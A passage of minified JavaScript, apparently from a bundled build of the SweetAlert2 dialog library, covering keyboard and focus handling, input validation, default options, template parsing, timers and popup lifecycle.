0:t.click()},Mc=Object.freeze({cancel:"cancel",backdrop:"backdrop",close:"close",esc:"esc",timer:"timer"}),QT=t=>{t.keydownTarget&&t.keydownHandlerAdded&&(t.keydownTarget.removeEventListener("keydown",t.keydownHandler,{capture:t.keydownListenerCapture}),t.keydownHandlerAdded=!1)},rD=(t,e,n)=>{QT(t),e.toast||(t.keydownHandler=i=>aD(e,i,n),t.keydownTarget=e.keydownListenerCapture?window:wt(),t.keydownListenerCapture=e.keydownListenerCapture,t.keydownTarget.addEventListener("keydown",t.keydownHandler,{capture:t.keydownListenerCapture}),t.keydownHandlerAdded=!0)},S0=(t,e)=>{var n;const i=Uv();if(i.length){t=t+e,t===-2&&(t=i.length-1),t===i.length?t=0:t===-1&&(t=i.length-1),i[t].focus();return}(n=wt())===null||n===void 0||n.focus()},KT=["ArrowRight","ArrowDown"],sD=["ArrowLeft","ArrowUp"],aD=(t,e,n)=>{t&&(e.isComposing||e.keyCode===229||(t.stopKeydownPropagation&&e.stopPropagation(),e.key==="Enter"?oD(e,t):e.key==="Tab"?lD(e):[...KT,...sD].includes(e.key)?cD(e.key):e.key==="Escape"&&uD(e,t,n)))},oD=(t,e)=>{if(!Wm(e.allowEnterKey))return;const n=Jm(wt(),e.input);if(t.target&&n&&t.target instanceof HTMLElement&&t.target.outerHTML===n.outerHTML){if(["textarea","file"].includes(e.input))return;YT(),t.preventDefault()}},lD=t=>{const e=t.target,n=Uv();let i=-1;for(let s=0;s<n.length;s++)if(e===n[s]){i=s;break}t.shiftKey?S0(i,-1):S0(i,1),t.stopPropagation(),t.preventDefault()},cD=t=>{const e=Ud(),n=Zr(),i=Jo(),s=kc();if(!e||!n||!i||!s)return;const o=[n,i,s];if(document.activeElement instanceof HTMLElement&&!o.includes(document.activeElement))return;const c=KT.includes(t)?"nextElementSibling":"previousElementSibling";let d=document.activeElement;if(d){for(let f=0;f<e.children.length;f++){if(d=d[c],!d)return;if(d instanceof HTMLButtonElement&&_i(d))break}d instanceof HTMLButtonElement&&d.focus()}},uD=(t,e,n)=>{Wm(e.allowEscapeKey)&&(t.preventDefault(),n(Mc.esc))};var dc={swalPromiseResolve:new WeakMap,swalPromiseReject:new WeakMap};const dD=()=>{const t=ci();Array.from(document.body.children).forEach(n=>{n.contains(t)||(n.hasAttribute("aria-hidden")&&n.setAttribute("data-previous-aria-hidden",n.getAttribute("aria-hidden")||""),n.setAttribute("aria-hidden","true"))})},WT=()=>{Array.from(document.body.children).forEach(e=>{e.hasAttribute("data-previous-aria-hidden")?(e.setAttribute("aria-hidden",e.getAttribute("data-previous-aria-hidden")||""),e.removeAttribute("data-previous-aria-hidden")):e.removeAttribute("aria-hidden")})},$T=typeof window<"u"&&!!window.GestureEvent,hD=()=>{if($T&&!Os(document.body,re.iosfix)){const t=document.body.scrollTop;document.body.style.top=`${t*-1}px`,At(document.body,re.iosfix),fD()}},fD=()=>{const t=ci();if(!t)return;let e;t.ontouchstart=n=>{e=mD(n)},t.ontouchmove=n=>{e&&(n.preventDefault(),n.stopPropagation())}},mD=t=>{const e=t.target,n=ci(),i=jv();return!n||!i||pD(t)||gD(t)?!1:e===n||!C0(n)&&e instanceof HTMLElement&&!mk(e,i)&&e.tagName!=="INPUT"&&e.tagName!=="TEXTAREA"&&!(C0(i)&&i.contains(e))},pD=t=>t.touches&&t.touches.length&&t.touches[0].touchType==="stylus",gD=t=>t.touches&&t.touches.length>1,yD=()=>{if(Os(document.body,re.iosfix)){const t=parseInt(document.body.style.top,10);lr(document.body,re.iosfix),document.body.style.top="",document.body.scrollTop=t*-1}},vD=()=>{const t=document.createElement("div");t.className=re["scrollbar-measure"],document.body.appendChild(t);const e=t.getBoundingClientRect().width-t.clientWidth;return document.body.removeChild(t),e};let ec=null;const _D=t=>{ec===null&&(document.body.scrollHeight>window.innerHeight||t==="scroll")&&(ec=parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right")),document.body.style.paddingRight=`${ec+vD()}px`)},wD=()=>{ec!==null&&(document.body.style.paddingRight=`${ec}px`,ec=null)};function XT(t,e,n,i){Zm()?jx(t,i):(rk(n).then(()=>jx(t,i)),QT(Oe)),$T?(e.setAttribute("style","display:none !important"),e.removeAttribute("class"),e.innerHTML=""):e.remove(),Bv()&&(wD(),yD(),WT()),bD()}function bD(){lr([document.documentElement,document.body],[re.shown,re["height-auto"],re["no-backdrop"],re["toast-shown"]])}function Ia(t){t=AD(t);const e=dc.swalPromiseResolve.get(this),n=xD(this);this.isAwaitingPromise?t.isDismissed||(Fd(this),e(t)):n&&e(t)}const xD=t=>{const e=wt();if(!e)return!1;const n=zt.innerParams.get(t);if(!n||Os(e,n.hideClass.popup))return!1;lr(e,n.showClass.popup),At(e,n.hideClass.popup);const i=ci();return lr(i,n.showClass.backdrop),At(i,n.hideClass.backdrop),ED(t,e,n),!0};function ZT(t){const e=dc.swalPromiseReject.get(this);Fd(this),e&&e(t)}const Fd=t=>{t.isAwaitingPromise&&(delete t.isAwaitingPromise,zt.innerParams.get(t)||t._destroy())},AD=t=>typeof t>"u"?{isConfirmed:!1,isDenied:!1,isDismissed:!0}:Object.assign({isConfirmed:!1,isDenied:!1,isDismissed:!1},t),ED=(t,e,n)=>{var i;const s=ci(),o=LT(e);typeof n.willClose=="function"&&n.willClose(e),(i=Oe.eventEmitter)===null||i===void 0||i.emit("willClose",e),o?TD(t,e,s,n.returnFocus,n.didClose):XT(t,s,n.returnFocus,n.didClose)},TD=(t,e,n,i,s)=>{Oe.swalCloseEventFinishedCallback=XT.bind(null,t,n,i,s);const o=function(c){if(c.target===e){var d;(d=Oe.swalCloseEventFinishedCallback)===null||d===void 0||d.call(Oe),delete Oe.swalCloseEventFinishedCallback,e.removeEventListener("animationend",o),e.removeEventListener("transitionend",o)}};e.addEventListener("animationend",o),e.addEventListener("transitionend",o)},jx=(t,e)=>{setTimeout(()=>{var n;typeof e=="function"&&e.bind(t.params)(),(n=Oe.eventEmitter)===null||n===void 0||n.emit("didClose"),t._destroy&&t._destroy()})},hc=t=>{let e=wt();if(e||new Ln,e=wt(),!e)return;const n=Dc();Zm()?$n(Ic()):CD(e,t),In(n),e.setAttribute("data-loading","true"),e.setAttribute("aria-busy","true"),e.focus()},CD=(t,e)=>{const n=Ud(),i=Dc();!n||!i||(!e&&_i(Zr())&&(e=Zr()),In(n),e&&($n(e),i.setAttribute("data-button-to-replace",e.className),n.insertBefore(i,e)),At([t,n],re.loading))},SD=(t,e)=>{e.input==="select"||e.input==="radio"?DD(t,e):["text","email","number","tel","textarea"].some(n=>n===e.input)&&(Ov(e.inputValue)||Pv(e.inputValue))&&(hc(Zr()),MD(t,e))},ND=(t,e)=>{const n=t.getInput();if(!n)return null;switch(e.input){case"checkbox":return RD(n);case"radio":return ID(n);case"file":return kD(n);default:return e.inputAutoTrim?n.value.trim():n.value}},RD=t=>t.checked?1:0,ID=t=>t.checked?t.value:null,kD=t=>t.files&&t.files.length?t.getAttribute("multiple")!==null?t.files:t.files[0]:null,DD=(t,e)=>{const n=wt();if(!n)return;const i=s=>{e.input==="select"?OD(n,am(s),e):e.input==="radio"&&PD(n,am(s),e)};Ov(e.inputOptions)||Pv(e.inputOptions)?(hc(Zr()),Ld(e.inputOptions).then(s=>{t.hideLoading(),i(s)})):typeof e.inputOptions=="object"?i(e.inputOptions):Zo(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof e.inputOptions}`)},MD=(t,e)=>{const n=t.getInput();n&&($n(n),Ld(e.inputValue).then(i=>{n.value=e.input==="number"?`${parseFloat(i)||0}`:`${i}`,In(n),n.focus(),t.hideLoading()}).catch(i=>{Zo(`Error in inputValue promise: ${i}`),n.value="",In(n),n.focus(),t.hideLoading()}))};function OD(t,e,n){const i=Ra(t,re.select);if(!i)return;const s=(o,c,d)=>{const f=document.createElement("option");f.value=d,Ui(f,c),f.selected=JT(d,n.inputValue),o.appendChild(f)};e.forEach(o=>{const c=o[0],d=o[1];if(Array.isArray(d)){const f=document.createElement("optgroup");f.label=c,f.disabled=!1,i.appendChild(f),d.forEach(p=>s(f,p[1],p[0]))}else s(i,d,c)}),i.focus()}function PD(t,e,n){const i=Ra(t,re.radio);if(!i)return;e.forEach(o=>{const c=o[0],d=o[1],f=document.createElement("input"),p=document.createElement("label");f.type="radio",f.name=re.radio,f.value=c,JT(c,n.inputValue)&&(f.checked=!0);const v=document.createElement("span");Ui(v,d),v.className=re.label,p.appendChild(f),p.appendChild(v),i.appendChild(p)});const s=i.querySelectorAll("input");s.length&&s[0].focus()}const am=t=>{const e=[];return t instanceof Map?t.forEach((n,i)=>{let s=n;typeof s=="object"&&(s=am(s)),e.push([i,s])}):Object.keys(t).forEach(n=>{let i=t[n];typeof i=="object"&&(i=am(i)),e.push([n,i])}),e},JT=(t,e)=>!!e&&e.toString()===t.toString(),jD=t=>{const e=zt.innerParams.get(t);t.disableButtons(),e.input?eC(t,"confirm"):Qv(t,!0)},LD=t=>{const e=zt.innerParams.get(t);t.disableButtons(),e.returnInputValueOnDeny?eC(t,"deny"):Yv(t,!1)},VD=(t,e)=>{t.disableButtons(),e(Mc.cancel)},eC=(t,e)=>{const n=zt.innerParams.get(t);if(!n.input){Zo(`The "input" parameter is needed to be set when using returnInputValueOn${Mv(e)}`);return}const i=t.getInput(),s=ND(t,n);n.inputValidator?UD(t,s,e):i&&!i.checkValidity()?(t.enableButtons(),t.showValidationMessage(n.validationMessage||i.validationMessage)):e==="deny"?Yv(t,s):Qv(t,s)},UD=(t,e,n)=>{const i=zt.innerParams.get(t);t.disableInput(),Promise.resolve().then(()=>Ld(i.inputValidator(e,i.validationMessage))).then(o=>{t.enableButtons(),t.enableInput(),o?t.showValidationMessage(o):n==="deny"?Yv(t,e):Qv(t,e)})},Yv=(t,e)=>{const n=zt.innerParams.get(t||void 0);n.showLoaderOnDeny&&hc(Jo()),n.preDeny?(t.isAwaitingPromise=!0,Promise.resolve().then(()=>Ld(n.preDeny(e,n.validationMessage))).then(s=>{s===!1?(t.hideLoading(),Fd(t)):t.close({isDenied:!0,value:typeof s>"u"?e:s})}).catch(s=>tC(t||void 0,s))):t.close({isDenied:!0,value:e})},Lx=(t,e)=>{t.close({isConfirmed:!0,value:e})},tC=(t,e)=>{t.rejectPromise(e)},Qv=(t,e)=>{const n=zt.innerParams.get(t||void 0);n.showLoaderOnConfirm&&hc(),n.preConfirm?(t.resetValidationMessage(),t.isAwaitingPromise=!0,Promise.resolve().then(()=>Ld(n.preConfirm(e,n.validationMessage))).then(s=>{_i($m())||s===!1?(t.hideLoading(),Fd(t)):Lx(t,typeof s>"u"?e:s)}).catch(s=>tC(t||void 0,s))):Lx(t,e)};function om(){const t=zt.innerParams.get(this);if(!t)return;const e=zt.domCache.get(this);$n(e.loader),Zm()?t.icon&&In(Ic()):BD(e),lr([e.popup,e.actions],re.loading),e.popup.removeAttribute("aria-busy"),e.popup.removeAttribute("data-loading"),e.confirmButton.disabled=!1,e.denyButton.disabled=!1,e.cancelButton.disabled=!1}const BD=t=>{const e=t.popup.getElementsByClassName(t.loader.getAttribute("data-button-to-replace"));e.length?In(e[0],"inline-block"):fk()&&$n(t.actions)};function nC(){const t=zt.innerParams.get(this),e=zt.domCache.get(this);return e?Jm(e.popup,t.input):null}function iC(t,e,n){const i=zt.domCache.get(t);e.forEach(s=>{i[s].disabled=n})}function rC(t,e){const n=wt();if(!(!n||!t))if(t.type==="radio"){const i=n.querySelectorAll(`[name="${re.radio}"]`);for(let s=0;s<i.length;s++)i[s].disabled=e}else t.disabled=e}function sC(){iC(this,["confirmButton","denyButton","cancelButton"],!1)}function aC(){iC(this,["confirmButton","denyButton","cancelButton"],!0)}function oC(){rC(this.getInput(),!1)}function lC(){rC(this.getInput(),!0)}function cC(t){const e=zt.domCache.get(this),n=zt.innerParams.get(this);Ui(e.validationMessage,t),e.validationMessage.className=re["validation-message"],n.customClass&&n.customClass.validationMessage&&At(e.validationMessage,n.customClass.validationMessage),In(e.validationMessage);const i=this.getInput();i&&(i.setAttribute("aria-invalid","true"),i.setAttribute("aria-describedby",re["validation-message"]),PT(i),At(i,re.inputerror))}function uC(){const t=zt.domCache.get(this);t.validationMessage&&$n(t.validationMessage);const e=this.getInput();e&&(e.removeAttribute("aria-invalid"),e.removeAttribute("aria-describedby"),lr(e,re.inputerror))}const tc={title:"",titleText:"",text:"",html:"",footer:"",icon:void 0,iconColor:void 0,iconHtml:void 0,template:void 0,toast:!1,draggable:!1,animation:!0,theme:"light",showClass:{popup:"swal2-show",backdrop:"swal2-backdrop-show",icon:"swal2-icon-show"},hideClass:{popup:"swal2-hide",backdrop:"swal2-backdrop-hide",icon:"swal2-icon-hide"},customClass:{},target:"body",color:void 0,backdrop:!0,heightAuto:!0,allowOutsideClick:!0,allowEscapeKey:!0,allowEnterKey:!0,stopKeydownPropagation:!0,keydownListenerCapture:!1,showConfirmButton:!0,showDenyButton:!1,showCancelButton:!1,preConfirm:void 0,preDeny:void 0,confirmButtonText:"OK",confirmButtonAriaLabel:"",confirmButtonColor:void 0,denyButtonText:"No",denyButtonAriaLabel:"",denyButtonColor:void 0,cancelButtonText:"Cancel",cancelButtonAriaLabel:"",cancelButtonColor:void 0,buttonsStyling:!0,reverseButtons:!1,focusConfirm:!0,focusDeny:!1,focusCancel:!1,returnFocus:!0,showCloseButton:!1,closeButtonHtml:"&times;",closeButtonAriaLabel:"Close this dialog",loaderHtml:"",showLoaderOnConfirm:!1,showLoaderOnDeny:!1,imageUrl:void 0,imageWidth:void 0,imageHeight:void 0,imageAlt:"",timer:void 0,timerProgressBar:!1,width:void 0,padding:void 0,background:void 0,input:void 0,inputPlaceholder:"",inputLabel:"",inputValue:"",inputOptions:{},inputAutoFocus:!0,inputAutoTrim:!0,inputAttributes:{},inputValidator:void 0,returnInputValueOnDeny:!1,validationMessage:void 0,grow:!1,position:"center",progressSteps:[],currentProgressStep:void 0,progressStepsDistance:void 0,willOpen:void 0,didOpen:void 0,didRender:void 0,willClose:void 0,didClose:void 0,didDestroy:void 0,scrollbarPadding:!0,topLayer:!1},zD=["allowEscapeKey","allowOutsideClick","background","buttonsStyling","cancelButtonAriaLabel","cancelButtonColor","cancelButtonText","closeButtonAriaLabel","closeButtonHtml","color","confirmButtonAriaLabel","confirmButtonColor","confirmButtonText","currentProgressStep","customClass","denyButtonAriaLabel","denyButtonColor","denyButtonText","didClose","didDestroy","draggable","footer","hideClass","html","icon","iconColor","iconHtml","imageAlt","imageHeight","imageUrl","imageWidth","preConfirm","preDeny","progressSteps","returnFocus","reverseButtons","showCancelButton","showCloseButton","showConfirmButton","showDenyButton","text","title","titleText","theme","willClose"],FD={allowEnterKey:void 0},HD=["allowOutsideClick","allowEnterKey","backdrop","draggable","focusConfirm","focusDeny","focusCancel","returnFocus","heightAuto","keydownListenerCapture"],dC=t=>Object.prototype.hasOwnProperty.call(tc,t),hC=t=>zD.indexOf(t)!==-1,fC=t=>FD[t],qD=t=>{dC(t)||li(`Unknown parameter "${t}"`)},GD=t=>{HD.includes(t)&&li(`The parameter "${t}" is incompatible with toasts`)},YD=t=>{const e=fC(t);e&&kT(t,e)},mC=t=>{t.backdrop===!1&&t.allowOutsideClick&&li('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`'),t.theme&&!["light","dark","auto","minimal","borderless","embed-iframe","bulma","bulma-light","bulma-dark"].includes(t.theme)&&li(`Invalid theme "${t.theme}"`);for(const e in t)qD(e),t.toast&&GD(e),YD(e)};function pC(t){const e=ci(),n=wt(),i=zt.innerParams.get(this);if(!n||Os(n,i.hideClass.popup)){li("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");return}const s=QD(t),o=Object.assign({},i,s);mC(o),e.dataset.swal2Theme=o.theme,GT(this,o),zt.innerParams.set(this,o),Object.defineProperties(this,{params:{value:Object.assign({},this.params,t),writable:!1,enumerable:!0}})}const QD=t=>{const e={};return Object.keys(t).forEach(n=>{hC(n)?e[n]=t[n]:li(`Invalid parameter to update: ${n}`)}),e};function gC(){const t=zt.domCache.get(this),e=zt.innerParams.get(this);if(!e){yC(this);return}t.popup&&Oe.swalCloseEventFinishedCallback&&(Oe.swalCloseEventFinishedCallback(),delete Oe.swalCloseEventFinishedCallback),typeof e.didDestroy=="function"&&e.didDestroy(),Oe.eventEmitter.emit("didDestroy"),KD(this)}const KD=t=>{yC(t),delete t.params,delete Oe.keydownHandler,delete Oe.keydownTarget,delete Oe.currentInstance},yC=t=>{t.isAwaitingPromise?(e0(zt,t),t.isAwaitingPromise=!0):(e0(dc,t),e0(zt,t),delete t.isAwaitingPromise,delete t.disableButtons,delete t.enableButtons,delete t.getInput,delete t.disableInput,delete t.enableInput,delete t.hideLoading,delete t.disableLoading,delete t.showValidationMessage,delete t.resetValidationMessage,delete t.close,delete t.closePopup,delete t.closeModal,delete t.closeToast,delete t.rejectPromise,delete t.update,delete t._destroy)},e0=(t,e)=>{for(const n in t)t[n].delete(e)};var WD=Object.freeze({__proto__:null,_destroy:gC,close:Ia,closeModal:Ia,closePopup:Ia,closeToast:Ia,disableButtons:aC,disableInput:lC,disableLoading:om,enableButtons:sC,enableInput:oC,getInput:nC,handleAwaitingPromise:Fd,hideLoading:om,rejectPromise:ZT,resetValidationMessage:uC,showValidationMessage:cC,update:pC});const $D=(t,e,n)=>{t.toast?XD(t,e,n):(JD(e),eM(e),tM(t,e,n))},XD=(t,e,n)=>{e.popup.onclick=()=>{t&&(ZD(t)||t.timer||t.input)||n(Mc.close)}},ZD=t=>!!(t.showConfirmButton||t.showDenyButton||t.showCancelButton||t.showCloseButton);let lm=!1;const JD=t=>{t.popup.onmousedown=()=>{t.container.onmouseup=function(e){t.container.onmouseup=()=>{},e.target===t.container&&(lm=!0)}}},eM=t=>{t.container.onmousedown=e=>{e.target===t.container&&e.preventDefault(),t.popup.onmouseup=function(n){t.popup.onmouseup=()=>{},(n.target===t.popup||n.target instanceof HTMLElement&&t.popup.contains(n.target))&&(lm=!0)}}},tM=(t,e,n)=>{e.container.onclick=i=>{if(lm){lm=!1;return}i.target===e.container&&Wm(t.allowOutsideClick)&&n(Mc.backdrop)}},nM=t=>typeof t=="object"&&t.jquery,Vx=t=>t instanceof Element||nM(t),iM=t=>{const e={};return typeof t[0]=="object"&&!Vx(t[0])?Object.assign(e,t[0]):["title","html","icon"].forEach((n,i)=>{const s=t[i];typeof s=="string"||Vx(s)?e[n]=s:s!==void 0&&Zo(`Unexpected type of ${n}! Expected "string" or "Element", got ${typeof s}`)}),e};function rM(...t){return new this(...t)}function sM(t){class e extends this{_main(i,s){return super._main(i,Object.assign({},t,s))}}return e}const aM=()=>Oe.timeout&&Oe.timeout.getTimerLeft(),vC=()=>{if(Oe.timeout)return pk(),Oe.timeout.stop()},_C=()=>{if(Oe.timeout){const t=Oe.timeout.start();return Fv(t),t}},oM=()=>{const t=Oe.timeout;return t&&(t.running?vC():_C())},lM=t=>{if(Oe.timeout){const e=Oe.timeout.increase(t);return Fv(e,!0),e}},cM=()=>!!(Oe.timeout&&Oe.timeout.isRunning());let Ux=!1;const N0={};function uM(t="data-swal-template"){N0[t]=this,Ux||(document.body.addEventListener("click",dM),Ux=!0)}const dM=t=>{for(let e=t.target;e&&e!==document;e=e.parentNode)for(const n in N0){const i=e.getAttribute(n);if(i){N0[n].fire({template:i});return}}};let hM=class{constructor(){this.events={}}_getHandlersByEventName(e){return typeof this.events[e]>"u"&&(this.events[e]=[]),this.events[e]}on(e,n){const i=this._getHandlersByEventName(e);i.includes(n)||i.push(n)}once(e,n){const i=(...s)=>{this.removeListener(e,i),n.apply(this,s)};this.on(e,i)}emit(e,...n){this._getHandlersByEventName(e).forEach(i=>{try{i.apply(this,n)}catch(s){console.error(s)}})}removeListener(e,n){const i=this._getHandlersByEventName(e),s=i.indexOf(n);s>-1&&i.splice(s,1)}removeAllListeners(e){this.events[e]!==void 0&&(this.events[e].length=0)}reset(){this.events={}}};Oe.eventEmitter=new hM;const fM=(t,e)=>{Oe.eventEmitter.on(t,e)},mM=(t,e)=>{Oe.eventEmitter.once(t,e)},pM=(t,e)=>{if(!t){Oe.eventEmitter.reset();return}e?Oe.eventEmitter.removeListener(t,e):Oe.eventEmitter.removeAllListeners(t)};var gM=Object.freeze({__proto__:null,argsToParams:iM,bindClickHandler:uM,clickCancel:iD,clickConfirm:YT,clickDeny:nD,enableLoading:hc,fire:rM,getActions:Ud,getCancelButton:kc,getCloseButton:Vv,getConfirmButton:Zr,getContainer:ci,getDenyButton:Jo,getFocusableElements:Uv,getFooter:OT,getHtmlContainer:jv,getIcon:Ic,getIconContent:lk,getImage:MT,getInputLabel:ck,getLoader:Dc,getPopup:wt,getProgressSteps:Lv,getTimerLeft:aM,getTimerProgressBar:Xm,getTitle:DT,getValidationMessage:$m,increaseTimer:lM,isDeprecatedParameter:fC,isLoading:dk,isTimerRunning:cM,isUpdatableParameter:hC,isValidParameter:dC,isVisible:tD,mixin:sM,off:pM,on:fM,once:mM,resumeTimer:_C,showLoading:hc,stopTimer:vC,toggleTimer:oM});class yM{constructor(e,n){this.callback=e,this.remaining=n,this.running=!1,this.start()}start(){return this.running||(this.running=!0,this.started=new Date,this.id=setTimeout(this.callback,this.remaining)),this.remaining}stop(){return this.started&&this.running&&(this.running=!1,clearTimeout(this.id),this.remaining-=new Date().getTime()-this.started.getTime()),this.remaining}increase(e){const n=this.running;return n&&this.stop(),this.remaining+=e,n&&this.start(),this.remaining}getTimerLeft(){return this.running&&(this.stop(),this.start()),this.remaining}isRunning(){return this.running}}const wC=["swal-title","swal-html","swal-footer"],vM=t=>{const e=typeof t.template=="string"?document.querySelector(t.template):t.template;if(!e)return{};const n=e.content;return CM(n),Object.assign(_M(n),wM(n),bM(n),xM(n),AM(n),EM(n),TM(n,wC))},_M=t=>{const e={};return Array.from(t.querySelectorAll("swal-param")).forEach(i=>{zo(i,["name","value"]);const s=i.getAttribute("name"),o=i.getAttribute("value");!s||!o||(typeof tc[s]=="boolean"?e[s]=o!=="false":typeof tc[s]=="object"?e[s]=JSON.parse(o):e[s]=o)}),e},wM=t=>{const e={};return Array.from(t.querySelectorAll("swal-function-param")).forEach(i=>{const s=i.getAttribute("name"),o=i.getAttribute("value");!s||!o||(e[s]=new Function(`return ${o}`)())}),e},bM=t=>{const e={};return Array.from(t.querySelectorAll("swal-button")).forEach(i=>{zo(i,["type","color","aria-label"]);const s=i.getAttribute("type");!s||!["confirm","cancel","deny"].includes(s)||(e[`${s}ButtonText`]=i.innerHTML,e[`show${Mv(s)}Button`]=!0,i.hasAttribute("color")&&(e[`${s}ButtonColor`]=i.getAttribute("color")),i.hasAttribute("aria-label")&&(e[`${s}ButtonAriaLabel`]=i.getAttribute("aria-label")))}),e},xM=t=>{const e={},n=t.querySelector("swal-image");return n&&(zo(n,["src","width","height","alt"]),n.hasAttribute("src")&&(e.imageUrl=n.getAttribute("src")||void 0),n.hasAttribute("width")&&(e.imageWidth=n.getAttribute("width")||void 0),n.hasAttribute("height")&&(e.imageHeight=n.getAttribute("height")||void 0),n.hasAttribute("alt")&&(e.imageAlt=n.getAttribute("alt")||void 0)),e},AM=t=>{const e={},n=t.querySelector("swal-icon");return n&&(zo(n,["type","color"]),n.hasAttribute("type")&&(e.icon=n.getAttribute("type")),n.hasAttribute("color")&&(e.iconColor=n.getAttribute("color")),e.iconHtml=n.innerHTML),e},EM=t=>{const e={},n=t.querySelector("swal-input");n&&(zo(n,["type","label","placeholder","value"]),e.input=n.getAttribute("type")||"text",n.hasAttribute("label")&&(e.inputLabel=n.getAttribute("label")),n.hasAttribute("placeholder")&&(e.inputPlaceholder=n.getAttribute("placeholder")),n.hasAttribute("value")&&(e.inputValue=n.getAttribute("value")));const i=Array.from(t.querySelectorAll("swal-input-option"));return i.length&&(e.inputOptions={},i.forEach(s=>{zo(s,["value"]);const o=s.getAttribute("value");if(!o)return;const c=s.innerHTML;e.inputOptions[o]=c})),e},TM=(t,e)=>{const n={};for(const i in e){const s=e[i],o=t.querySelector(s);o&&(zo(o,[]),n[s.replace(/^swal-/,"")]=o.innerHTML.trim())}return n},CM=t=>{const e=wC.concat(["swal-param","swal-function-param","swal-button","swal-image","swal-icon","swal-input","swal-input-option"]);Array.from(t.children).forEach(n=>{const i=n.tagName.toLowerCase();e.includes(i)||li(`Unrecognized element <${i}>`)})},zo=(t,e)=>{Array.from(t.attributes).forEach(n=>{e.indexOf(n.name)===-1&&li([`Unrecognized attribute "${n.name}" on <${t.tagName.toLowerCase()}>.`,`${e.length?`Allowed attributes are: ${e.join(", ")}`:"To set the value, use HTML within the element."}`])})},bC=10,SM=t=>{const e=ci(),n=wt();typeof t.willOpen=="function"&&t.willOpen(n),Oe.eventEmitter.emit("willOpen",n);const s=window.getComputedStyle(document.body).overflowY;IM(e,n,t),setTimeout(()=>{NM(e,n)},bC),Bv()&&(RM(e,t.scrollbarPadding,s),dD()),!Zm()&&!Oe.previousActiveElement&&(Oe.previousActiveElement=document.activeElement),typeof t.didOpen=="function"&&setTimeout(()=>t.didOpen(n)),Oe.eventEmitter.emit("didOpen",n),lr(e,re["no-transition"])},cm=t=>{const e=wt();if(t.target!==e)return;const n=ci();e.removeEventListener("animationend",cm),e.removeEventListener("transitionend",cm),n.style.overflowY="auto"},NM=(t,e)=>{LT(e)?(t.style.overflowY="hidden",e.addEventListener("animationend",cm),e.addEventListener("transitionend",cm)):t.style.overflowY="auto"},RM=(t,e,n)=>{hD(),e&&n!=="hidden"&&_D(n),setTimeout(()=>{t.scrollTop=0})},IM=(t,e,n)=>{At(t,n.showClass.backdrop),n.animation?(e.style.setProperty("opacity","0","important"),In(e,"grid"),setTimeout(()=>{At(e,n.showClass.popup),e.style.removeProperty("opacity")},bC)):In(e,"grid"),At([document.documentElement,document.body],re.shown),n.heightAuto&&n.backdrop&&!n.toast&&At([document.documentElement,document.body],re["height-auto"])};var Bx={email:(t,e)=>/^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(t)?Promise.resolve():Promise.resolve(e||"Invalid email address"),url:(t,e)=>/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(t)?Promise.resolve():Promise.resolve(e||"Invalid URL")};function kM(t){t.inputValidator||(t.input==="email"&&(t.inputValidator=Bx.email),t.input==="url"&&(t.inputValidator=Bx.url))}function DM(t){(!t.target||typeof t.target=="string"&&!document.querySelector(t.target)||typeof t.target!="string"&&!t.target.appendChild)&&(li('Target parameter is not valid, defaulting to "body"'),t.target="body")}function MM(t){kM(t),t.showLoaderOnConfirm&&!t.preConfirm&&li(`showLoaderOnConfirm is set to true, but preConfirm is not defined.
showLoaderOnConfirm should be used together with preConfirm, see usage example:
https://sweetalert2.github.io/#ajax-request`),DM(t),typeof t.title=="string"&&(t.title=t.title.split(`
`).join("<br />")),Ak(t)}let qr;var Af=new WeakMap;class nn{constructor(...e){if(ek(this,Af,void 0),typeof window>"u")return;qr=this;const n=Object.freeze(this.constructor.argsToParams(e));this.params=n,this.isAwaitingPromise=!1,tk(Af,this,this._main(qr.params))}_main(e,n={}){if(mC(Object.assign({},n,e)),Oe.currentInstance){const o=dc.swalPromiseResolve.get(Oe.currentInstance),{isAwaitingPromise:c}=Oe.currentInstance;Oe.currentInstance._destroy(),c||o({isDismissed:!0}),Bv()&&WT()}Oe.currentInstance=qr;const i=PM(e,n);MM(i),Object.freeze(i),Oe.timeout&&(Oe.timeout.stop(),delete Oe.timeout),clearTimeout(Oe.restoreFocusTimeout);const s=jM(qr);return GT(qr,i),zt.innerParams.set(qr,i),OM(qr,s,i)}then(e){return Ix(Af,this).then(e)}finally(e){return Ix(Af,this).finally(e)}}const OM=(t,e,n)=>new Promise((i,s)=>{const o=c=>{t.close({isDismissed:!0,dismiss:c})};dc.swalPromiseResolve.set(t,i),dc.swalPromiseReject.set(t,s),e.confirmButton.onclick=()=>{jD(t)},e.denyButton.onclick=()=>{LD(t)},e.cancelButton.onclick=()=>{VD(t,o)},e.closeButton.onclick=()=>{o(Mc.close)},$D(n,e,o),rD(Oe,n,o),SD(t,n),SM(n),LM(Oe,n,o),VM(e,n),setTimeout(()=>{e.container.scrollTop=0})}),PM=(t,e)=>{const n=vM(t),i=Object.assign({},tc,e,n,t);return i.showClass=Object.assign({},tc.showClass,i.showClass),i.hideClass=Object.assign({},tc.hideClass,i.hideClass),i.animation===!1&&(i.showClass={backdrop:"swal2-noanimation"},i.hideClass={}),i},jM=t=>{const e={popup:wt(),container:ci(),actions:Ud(),confirmButton:Zr(),denyButton:Jo(),cancelButton:kc(),loader:Dc(),closeButton:Vv(),validationMessage:$m(),progressSteps:Lv()};return zt.domCache.set(t,e),e},LM=(t,e,n)=>{const i=Xm();$n(i),e.timer&&(t.timeout=new yM(()=>{n("timer"),delete t.timeout},e.timer),e.timerProgressBar&&(In(i),Li(i,e,"timerProgressBar"),setTimeout(()=>{t.timeout&&t.timeout.running&&Fv(e.timer)})))},VM=(t,e)=>{if(!e.toast){if(!Wm(e.allowEnterKey)){kT("allowEnterKey"),zM();return}UM(t)||BM(t,e)||S0(-1,1)}},UM=t=>{const e=Array.from(t.popup.querySelectorAll("[autofocus]"));for(const n of e)if(n instanceof HTMLElement&&_i(n))return n.focus(),!0;return!1},BM=(t,e)=>e.focusDeny&&_i(t.denyButton)?(t.denyButton.focus(),!0):e.focusCancel&&_i(t.cancelButton)?(t.cancelButton.focus(),!0):e.focusConfirm&&_i(t.confirmButton)?(t.confirmButton.focus(),!0):!1,zM=()=>{document.activeElement instanceof HTMLElement&&typeof 